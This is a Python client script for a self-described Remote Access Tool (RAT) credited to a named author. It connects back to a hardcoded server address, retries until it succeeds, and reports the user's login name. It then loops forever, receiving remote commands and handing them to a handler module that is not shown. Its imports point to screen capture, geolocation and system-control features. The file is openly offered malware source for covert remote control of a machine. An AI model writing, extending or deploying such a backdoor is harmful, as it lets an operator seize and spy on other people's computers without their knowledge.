"""
client.py
version = 0.002
Remote Access Tool
Made by Lukas Alstrup
github.com/LukasAlstrup/rat

"""

debug = True
#TODO configure debug mode

import os
import socket
import pyautogui
import time
import getpass
import requests
import subprocess
import geocoder
import ctypes
import sys
from functions import *
import signal
import struct



#Server
port = 8080
host = "192.168.0.14"

s = socket.socket()
print("[+] Server: ", host, " Port: ", port)

#Connect to the server
while True:
    try:
        s.connect((host, port))
        break
    except ConnectionRefusedError:
        print("[-] The server refused to conect. A fireall may be blocking the port")
    except TimeoutError:
        print("[-] No response from the server")
    except Exception as e:
        print("[-] Error while connecting to the server: ", e)


print("Connected to the server successfully")

s.send(getpass.getuser().encode())


while True:
    #hi = s.recv(1024).decode()
    #print(hi)
    command = s.recv(1024)
    command = command.decode()
    check_command(s,command)